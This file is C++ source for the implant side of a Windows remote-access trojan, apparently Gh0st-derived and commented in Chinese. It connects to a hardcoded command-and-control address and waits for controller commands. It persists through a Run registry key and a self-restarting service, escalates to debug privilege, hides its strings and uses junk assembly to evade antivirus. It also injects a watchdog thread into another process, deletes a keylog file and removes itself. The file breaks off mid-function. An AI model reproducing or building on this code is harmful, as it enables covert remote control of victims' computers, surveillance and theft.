#include "ClientSocket.h"
#include <IOSTREAM>
#include "install.h"
#include "decode.h"
#include "LoginServer.h"
#include "KernelManager.h"
#include <shlobj.h>   
#include "login.h"
#include "until.h"

#include  <io.h> //_access
#pragma  comment(lib, "shell32.lib")   

using namespace std;


#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )


enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 // 心跳时间



char* szDns = "192.168.50.142";
DWORD	dwPort = 9998;

#if 1     //客户端配置

#define ANTIVIRUSS  _asm nop;
#define FUCK360    Sleep(0);
#define FUCKNOD32  Sleep(0);

#if _DEBUG
MODIFY_DATA modify_data =
{
	"tb200LW4vtC5ttC1urSm",
		"vb29vqY=",
		"6gkIBfkS+qY=",
		"2N+0trS1trm0uaY=",
		"",
		TRUE,			//TRUE为绿色安装，FALSE为标准安装
		FALSE,			//TRUE为启动目录启动
		FALSE,			//TRUE为服务启动
		"",
		"",
		"",
		"",
		"",
		FILE_ATTRIBUTE_NORMAL,    //文件属性
		FALSE,
		"Cao360",
		0,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		"",
};
#else
MODIFY_DATA modify_data =
{
	"           D         ",
		"",
		"",
		"",
		"",
		TRUE,			//TRUE为绿色安装，FALSE为标准安装
		FALSE,			//TRUE为启动目录启动
		FALSE,			//TRUE为服务启动
		"",
		"",
		"",
		"",
		"",
		FILE_ATTRIBUTE_NORMAL,    //文件属性
		FALSE,
		"Cao360",
		0,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		"",
};

#endif

void RaiseToDebugP()  //提权函数  
{
	HANDLE hToken;
	HANDLE hProcess = GetCurrentProcess();
	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		TOKEN_PRIVILEGES tkp;
		char QNdJE01[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e','\0' };
		if (LookupPrivilegeValue(NULL, QNdJE01, &tkp.Privileges[0].Luid))
		{
			tkp.PrivilegeCount = 1;
			FUCKNOD32
				tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			BOOL bREt = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
			FUCKNOD32

		}
		CloseHandle(hToken);

	}
}
DWORD WINAPI Login();

LONG WINAPI bad_exception2(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL, true);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}



void WINAPI runwin10()
{
	TCHAR   szPath[MAX_PATH];
	if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
	{
	}
	char FileName[80];
	//定义
	char szFileName[MAX_PATH] = { 0 };
	char TssjxFS[80];
	// 			char TssjxFS[] = "C:\\Windows\\c.exe";
	//路径
//	wsprintf(TssjxFS,"C:\\Windows\\%s",dll_info.ReleaseName);
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	//	CopyFile(szFileName, TssjxFS, FALSE);
	// 	HKEY hKeyhKey ;
	// 	if (RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKeyhKey)==ERROR_SUCCESS)
	// 	{
	// 		RegSetValueEx(hKeyhKey,(""),NULL,REG_SZ,(BYTE*)szFileName,sizeof(szFileName));
	// 		RegCloseKey(hKeyhKey);
	// 	}
}

//运行互斥 建立对象名称
BOOL my_CreateEvent(BOOL str)
{
	BOOL strts = NULL;

	////////////////////////////////////////////////////////////////////////////////////////////////
	//互斥  用于重复运行

	HANDLE hMutex = CreateEvent(NULL, FALSE, FALSE, modify_data.Mexi);  //运行互斥 对象名称
	if (hMutex != NULL)  //建立成功
	{
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			Sleep(1000);
			strts = TRUE;
		}

		if (str)
		{
			CloseHandle(hMutex);  //释放 互诉
		}
	}
	else
		strts = TRUE;

	return strts;
}






#endif

DWORD WINAPI Login()
{
	// 	OutputDebugString("进入login");
	HANDLE	hEvent = NULL;
	char	strKillEvent[100];

	//char* szDns = (char*)FindConfigString(CKernelManager::g_hInstance, "ABCD");
	//if (szDns == NULL)
	//{
	//	return -1;
	//}
	//char* szDns = "192.168.50.142";
	//szDns = (char*)(MyDecode(szDns +4));  //解密被加密的字符串

	wsprintf(strKillEvent, "%s %d", szDns, GetTickCount());

	HANDLE m_hMutex;
	//m_hMutex = CreateMutex(NULL, FALSE, szDns);
	m_hMutex = CreateMutex(NULL, FALSE, MyDecode(modify_data.szDns));
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return -1;
	}
	SetUnhandledExceptionFilter(bad_exception2);//错误处理
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)runwin10, NULL, NULL, NULL);

	szDns = MyDecode(modify_data.szDns);
	dwPort = atoi(MyDecode(modify_data.dwPort));
	//char por[10];
	//sprintf(por, "%d", dwPort);
	//MessageBox(0, szDns, por, 0);
	// 设置窗台
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);



	CClientSocket socketClient;
	CKernelManager	manager(&socketClient);
	manager.StartUnLineHook();
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 1; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
				
				}
				// 改一下
				Sleep(HEART_BEAT_TIME);
			}
		}
		//		OutputDebugString("准备获取上线信息");
		/*if (!getLoginInfo(szDns, &lpszHost, &dwPort))
		{
			bBreakError = GETLOGINFO_ERROR;
			continue;
		}*/

		DWORD dwTickCount = GetTickCount();
		/*char* szOnline = (char*)FindConfigString(CKernelManager::g_hInstance, "UVWX");
		if (szOnline == NULL)
		{
			return -1;
		}*/



		if (!socketClient.Connect(szDns, dwPort))//尝试连接A地址
		{

			bBreakError = CONNECT_ERROR;
			continue;

		}

		/************************************************************************/

		BYTE	bToken = TOKEN_HEARTBEAT;
		socketClient.Send((LPBYTE)&bToken, sizeof(bToken));

		/************************************************************************/

		// 登录
		DWORD dwExitCode = SOCKET_ERROR;

		DWORD upTickCount = GetTickCount() - dwTickCount;

		manager.init(&socketClient, strKillEvent, szDns, dwPort);
		// 		CKernelManager	manager(&socketClient,strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
		{
			socketClient.Disconnect();
			continue;
		}

	//	sendLoginInfo(&socketClient, upTickCount);
		sendLoginInfo(NULL, &socketClient, upTickCount);
		//////////////////////////////////////////////////////////////////////////
		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();
		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}

	return 0;
}





//
//BOOL DeleteMe()
//{
//
//	TCHAR szModule[MAX_PATH];
//	TCHAR szComspec[MAX_PATH];
//	TCHAR szParams[MAX_PATH];
//
//	if (GetModuleFileName(0, szModule, MAX_PATH) == 0)
//		return FALSE;
//	if (GetShortPathNameA(szModule, szModule, MAX_PATH) == 0)
//		return FALSE;
//	if (GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) == 0)
//		return FALSE;
//
//	// set command shell parameters
//	SetFileAttributesA(szModule, FILE_ATTRIBUTE_NORMAL);
//	strcpy(szParams, " /c ping -n 2 127.0.0.1 > nul && del ");
//	strcat(szParams, szModule);
//	strcat(szParams, " > nul");
//	strcat(szComspec, szParams);
//
//	// set struct members
//	STARTUPINFO si = { 0 };
//	PROCESS_INFORMATION	pi = { 0 };
//	si.cb = sizeof(si);
//	si.dwFlags = STARTF_USESHOWWINDOW;
//	si.wShowWindow = SW_HIDE;
//
//	// increase resource allocation to program
//	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
//	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
//
//	// invoke command shell
//	if (CreateProcessA(0, szComspec, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
//	{
//		// suppress command shell process until program exits
//		SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
//		SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);
//		// resume shell process with new low priority
//		ResumeThread(pi.hThread);
//		// everything seemed to work
//		return TRUE;
//	}
//	else // if error, normalize allocation
//	{
//		SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
//		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
//	}
//	return FALSE;
//}


//卸载服务端函数
void DelSelf(BOOL FHshanchu)
{
	//GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"), "GetSystemDirectoryA");
	// 删除离线记录文件
	char strRecordFile[MAX_PATH];
	SHGetSpecialFolderPath(NULL, strRecordFile, CSIDL_APPDATA, FALSE);
	//pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	char keylog[] = { '\\','o','u','r','l','o','g','.','d','a','t','\0' };
	lstrcat(strRecordFile, keylog);
	DeleteFile(strRecordFile);
	DeleteMe();  //程序自删除
	ExitProcess(0);
}




#include <iostream>
#include <stdlib.h>
#include <time.h>
using namespace std;

char* randstr(char* str, const int len)
{
	srand(time(NULL));
	int i;
	for (i = 0; i < len; ++i)
	{
		switch ((rand() % 3))
		{
		case 1:
			str[i] = 'A' + rand() % 26;
			break;
		case 2:
			str[i] = 'a' + rand() % 26;
			break;
		default:
			str[i] = '0' + rand() % 10;
			break;
		}
	}
	str[++i] = '\0';
	return str;
}


void qidx()
{
	char name[20];
	HKEY hKey;
	char pFileName[MAX_PATH] = { 0 };
	LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hKey);
	if (lRet == ERROR_SUCCESS) {
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		lRet = RegSetValueEx(hKey, modify_data.ReleaseName/*randstr(name, 8)*/, 0, REG_SZ, (BYTE*)pFileName, dwRet);
		RegCloseKey(hKey);
	}
}

char* my_strncpy(char* dest, const char* source, int count)
{
	char* p = dest;
	while (count && (*p++ = *source++)) count--;
	while (count--)
		*p++ = '\0';
	return(dest);
}


VOID MyCreatDirector(LPSTR Path)   //创建文件夹
{

	CHAR Dir[MAX_PATH] = { NULL };
	int i;



	for (i = 0; (size_t)i < strlen(Path); i++)
	{
		if (Path[i] == '\\')
		{

			my_strncpy(Dir, Path, i);

			if (_access(Dir, NULL) == -1)
			{

				CreateDirectory(Dir, NULL);

			}
		}
	}

}

////////////////////////////////////////下面这几句添加到头


static BOOL fDelete_Me = FALSE;
//启动服务
static void RunService(/*char *m_ServPath,*/char* m_ServiceName, char* m_DisplayName, char* m_Description)
{

	char FilePath[MAX_PATH];
	GetModuleFileName(NULL, FilePath, MAX_PATH);
	char SystemPath[MAX_PATH];
	ExpandEnvironmentStrings(modify_data.ReleasePath, SystemPath, MAX_PATH);
	if (strncmp(SystemPath, FilePath, strlen(SystemPath)) != 0)
	{
		MyCreatDirector(SystemPath);   //创建文件夹
		char FileName[80];
		char cpXPZ[] = { '%','s','\0' };
		wsprintf(FileName, cpXPZ, modify_data.ReleaseName);
		if (SystemPath[strlen(SystemPath) - 1] == '\\') //去掉最后的'\\'
			SystemPath[strlen(SystemPath) - 1] = 0;
		strcat(SystemPath, "\\");
		strcat(SystemPath, FileName);
		CopyFile(FilePath, SystemPath, FALSE);
		//		Wj_OnButtonAdd(SystemPath);  //文件增大
		memset(FilePath, 0, MAX_PATH);
		strcpy(FilePath, SystemPath);
		SetFileAttributes(SystemPath, modify_data.FileAttribute);//文件属性
	}

	char Desc[MAX_PATH];
	HKEY key = NULL;
	SC_HANDLE newService = NULL, scm = NULL;
	__try
	{
		scm = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = CreateService(
			scm, m_ServiceName, m_DisplayName,
			SERVICE_ALL_ACCESS | SERVICE_CHANGE_CONFIG,
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			FilePath, NULL, NULL, NULL, NULL, NULL);
		//锁定一下服务...

		SC_LOCK sc_lock = LockServiceDatabase(scm);
		SERVICE_DESCRIPTION Service_Descrip = { &modify_data.Serdisplay[0] };
		ChangeServiceConfig2(newService, SERVICE_CONFIG_DESCRIPTION, &Service_Descrip);
		SERVICE_FAILURE_ACTIONS sdBuf = { 0 };
		sdBuf.lpRebootMsg = NULL;
		sdBuf.dwResetPeriod = 3600 * 24;
		SC_ACTION action[3];
		action[0].Delay = 7000;
		action[0].Type = SC_ACTION_RESTART;
		action[1].Delay = 0;
		action[1].Type = SC_ACTION_RESTART;
		action[2].Delay = 0;
		action[2].Type = SC_ACTION_RESTART;
		sdBuf.cActions = 3;
		sdBuf.lpsaActions = action;
		sdBuf.lpCommand = NULL;
		if (!ChangeServiceConfig2(newService, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf))
		{
			// 			OutputDebugString("ChangeServiceConfig2 failed");
		}

		UnlockServiceDatabase(sc_lock);
		if (newService == NULL)
		{
			if (GetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = OpenService(scm, m_ServiceName, SERVICE_ALL_ACCESS);
				if (newService == NULL)
					__leave;
				else
					StartService(newService, 0, 0);
			}
		}
		if (!StartService(newService, 0, 0))
			__leave;
		char YRuIB[] = { 'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','\0' };
		// 		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcpy(Desc, YRuIB);
		strcat(Desc, m_ServiceName);
		RegOpenKey(HKEY_LOCAL_MACHINE, Desc, &key);
		char jdkrg[] = { 'D','e','s','c','r','i','p','t','i','o','n','\0' };
		// 		API_RegSetValueExA(key,"Description", 0, REG_SZ, (CONST BYTE*)m_Description, lstrlen(m_Description));
		RegSetValueEx(key, jdkrg, 0, REG_SZ, (CONST BYTE*)m_Description, lstrlen(m_Description));
	}

	__finally
	{
		if (newService != NULL)
			CloseServiceHandle(newService);
		if (scm != NULL)
			CloseServiceHandle(scm);
		if (key != NULL)
			RegCloseKey(key);
	}
}

//以下是服务的外壳。不用管这么多。因为要写注释也不知道怎么写。格式是固定的
static BOOL service_is_exist()
{
	char SubKey[MAX_PATH] = { 0 };
	char cBKML[] = { 'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','\0' };
	strcpy(SubKey, cBKML);
	strcat(SubKey, modify_data.SerName);
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0L, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		RegCloseKey(hKey);  //注意！句柄泄漏咯  没释放..

		return TRUE;
	}
	else
		return FALSE;
}




static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;
static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
	switch (CtrlCode)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_PAUSE_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_CONTINUE_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	}
	SetServiceStatus(hSrv, &srvStatus);
}


HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;

	HINSTANCE userenv = LoadLibrary("userenv.dll");
	typedef DWORD(WINAPI* CEB)(LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);
	CEB  myCreateEnvironmentBlock = (CEB)GetProcAddress(userenv, "CreateEnvironmentBlock");


	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));

	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";

	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken, 0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	typedef DWORD(WINAPI* TWTSGetActiveConsoleSessionId)(void);

	TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
	MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId)GetProcAddress(LoadLibrary("Kernel32.dll"), "WTSGetActiveConsoleSessionId");

	if (MyWTSGetActiveConsoleSessionId)
	{
		TokenInformation = MyWTSGetActiveConsoleSessionId();

		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//                WTSQueryUserToken(TokenInformation,&hObject);
		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}

	if (userenv)
		FreeLibrary(userenv);

	return result;
}
BOOL    bisUnInstall = FALSE;


void ServiceMain(DWORD dwargc, wchar_t* argv[])
{
	hSrv = RegisterServiceCtrlHandler(modify_data.SerName, SvcCtrlFnct);
	if (hSrv == NULL)
		return;
	else
		FreeConsole();
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = NO_ERROR;
	srvStatus.dwWaitHint = 2000;
	srvStatus.dwCheckPoint = 1;
	srvStatus.dwCurrentState = SERVICE_START_PENDING;
	SetServiceStatus(hSrv, &srvStatus);
	srvStatus.dwCheckPoint = 0;
	Sleep(500);
	srvStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(hSrv, &srvStatus);


	HANDLE hMutex = CreateMutex(0, FALSE, modify_data.SerName);//创建内何对象用于防止运行两次以上
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ExitProcess(0);
		exit(0);
	}

	WSADATA Data;
	WSAStartup(0x202, &Data);


	OSVERSIONINFO OSversion;
	OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		if (OSversion.dwMajorVersion < 6)
		{
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			while (1)
			{
				Sleep(1000 * 1000);
			}
		}
		else
		{
			char CommandLine[1024], MyPath[MAX_PATH];
			HANDLE         hActiveSession = NULL;
			DWORD   ExitCode = 0;
			GetModuleFileName(NULL, MyPath, MAX_PATH);
			// 调试两天发现 直接运行rundll32.exe 会被某些下载者Kill  复制到
			wsprintfA(CommandLine, "%s Win7", MyPath);
			if (srvStatus.dwCurrentState != SERVICE_STOP_PENDING && srvStatus.dwCurrentState != SERVICE_STOPPED);
			{
				Sleep(1000);
				GetExitCodeProcess(hActiveSession, &ExitCode);

				if (ExitCode != 259)
				{
					CloseHandle(hActiveSession);
					Sleep(3000);
					hActiveSession = RunInActiveSession(CommandLine);
				}

			}

			WaitForSingleObject(hActiveSession, INFINITE);
			CloseHandle(hActiveSession);
		}
	}do
	{
		Sleep(100);
	} while (srvStatus.dwCurrentState != SERVICE_STOP_PENDING && srvStatus.dwCurrentState != SERVICE_STOPPED && bisUnInstall == FALSE);
	return;
}

#include <cstdio>
#include <iostream>
#include <cstdlib>
#include <string.h>
#include <string>
#include <strsafe.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <vector>

using namespace std;

#define MAX_LENGTH 255
#pragma warning(disable:4996)
//远程线程参数结构体
typedef struct _remoteTdParams
{
	LPVOID ZWinExec;             // WinExec Function Address
	LPVOID ZOpenProcess;         // OpenProcess Function Address
	LPVOID ZWaitForSingleObject; // WaitForSingleObject Function Address
	DWORD ZPid;                  // Param => Process id
	HANDLE ZProcessHandle;       // Param => Handle
	CHAR filePath[MAX_LENGTH];   // Param => File Path
}RemoteParam;

//本地线程参数结构体
typedef struct _localTdParams
{
	CHAR remoteProcName[MAX_LENGTH];
	DWORD localPid;
	DWORD remotePid;
	HANDLE hRemoteThread;
}LocalParam;

//字符串分割函数
BOOL SplitString(const string& s, vector<string>& v, const string& c)
{
	string::size_type pos1, pos2;
	pos2 = s.find(c);
	pos1 = 0;
	while (string::npos != pos2)
	{
		v.push_back(s.substr(pos1, pos2 - pos1));

		pos1 = pos2 + c.size();
		pos2 = s.find(c, pos1);
	}
	if (pos1 != s.length())
		v.push_back(s.substr(pos1));
	return TRUE;
}


//远程线程函数体 (守护函数)
DWORD WINAPI ThreadProc(RemoteParam* lprp)
{
	typedef UINT(WINAPI* ZWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
	typedef HANDLE(WINAPI* ZOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	typedef DWORD(WINAPI* ZWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
	ZWinExec ZWE;
	ZOpenProcess ZOP;
	ZWaitForSingleObject ZWFSO;
	ZWE = (ZWinExec)lprp->ZWinExec;
	ZOP = (ZOpenProcess)lprp->ZOpenProcess;
	ZWFSO = (ZWaitForSingleObject)lprp->ZWaitForSingleObject;
	lprp->ZProcessHandle = ZOP(PROCESS_ALL_ACCESS, FALSE, lprp->ZPid);
	ZWFSO(lprp->ZProcessHandle, INFINITE);
	ZWE(lprp->filePath, SW_SHOW);
	return 0;
}

//获取PID
DWORD __cdecl GetProcessID(CHAR* ProcessName)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;
	BOOL bProcess = Process32First(hProcessSnap, &pe32);
	while (bProcess)
	{
		if (strcmp(strupr(pe32.szExeFile), strupr(ProcessName)) == 0)
			return pe32.th32ProcessID;
		bProcess = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

//获取权限
int __cdecl EnableDebugPriv(const TCHAR* name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken)) return 1;
	if (!LookupPrivilegeValue(NULL, name, &luid)) return 1;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return 1;
	return 0;
}

//线程注入函数
BOOL __cdecl InjectProcess(const DWORD dwRemotePid, const DWORD dwLocalPid, HANDLE& hThread)
{
	if (EnableDebugPriv(SE_DEBUG_NAME)) return FALSE;
	HANDLE hWnd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemotePid);
	if (!hWnd) return FALSE;
	RemoteParam rp;
	ZeroMemory(&rp, sizeof(RemoteParam));
	rp.ZOpenProcess = (LPVOID)GetProcAddress(LoadLibrary("Kernel32.dll"), "OpenProcess");
	rp.ZWinExec = (LPVOID)GetProcAddress(LoadLibrary("Kernel32.dll"), "WinExec");
	rp.ZWaitForSingleObject = (LPVOID)GetProcAddress(LoadLibrary("Kernel32.dll"), "WaitForSingleObject");
	rp.ZPid = dwLocalPid;
	CHAR szPath[MAX_LENGTH] = "\0";
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	StringCchCopy(rp.filePath, sizeof(rp.filePath), szPath);
	RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(hWnd, 0, sizeof(RemoteParam), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteParam) return FALSE;
	if (!WriteProcessMemory(hWnd, pRemoteParam, &rp, sizeof(RemoteParam), 0)) return FALSE;
	LPVOID pRemoteThread = VirtualAllocEx(hWnd, 0, 1024 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread) return FALSE;
	if (!WriteProcessMemory(hWnd, pRemoteThread, &ThreadProc, 1024 * 4, 0)) return FALSE;
	hThread = CreateRemoteThread(hWnd, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, (LPVOID)pRemoteParam, 0, NULL);
	if (!hThread) return FALSE;
	return TRUE;
}

//远程线程监控函数（本地线程函数）
DWORD WINAPI WatchFuncData(LPVOID lprarm)
{
	HANDLE hRemoteThread = ((LocalParam*)lprarm)->hRemoteThread;
	DWORD dwLocalPid = ((LocalParam*)lprarm)->localPid;
	DWORD dwRemotePid = ((LocalParam*)lprarm)->remotePid;
	CHAR szRemoteProcName[MAX_LENGTH] = "\0";
	StringCchCopy(szRemoteProcName, sizeof(szRemoteProcName), ((LocalParam*)lprarm)->remoteProcName);
	DWORD exitCode = 0;
	while (TRUE)
	{
		if (!hRemoteThread) InjectProcess(dwRemotePid, dwLocalPid, hRemoteThread);
		GetExitCodeThread(hRemoteThread, &exitCode);
		if (exitCode ^ STILL_ACTIVE)
		{
			WinExec(szRemoteProcName, SW_HIDE);
			dwRemotePid = GetProcessID(szRemoteProcName);
			InjectProcess(dwRemotePid, dwLocalPid, hRemoteThread);
		}
		Sleep(1000);
	}
	return 0;
}
//===========================================
void KProcess()   //K终结者进程
{

	char CYZuy02[] = { 'r','u','n','d','l','l','3','2','.','e','x','e','\0' };
	if (GetProcessID(CYZuy02) != NULL)
	{

		WinExec("taskkill /f /im rundll32.exe", SW_HIDE);  //关闭进程
	}
}
#include "tlhelp32.h"
DWORD get_parent_processid(DWORD pid)

{

	DWORD ParentProcessID = -1;

	PROCESSENTRY32 pe;
	_asm inc eax;
	_asm dec ebx;
	_asm dec eax;
	_asm inc ebx;
	HANDLE hkz;

	HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));

	FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");

	if (Address == NULL)

	{

		OutputDebugString(_T("GetProc error"));
		_asm inc eax;
		_asm dec ebx;
		_asm dec eax;
		_asm inc ebx;
		return-1;

	}

	_asm

	{

		push 0

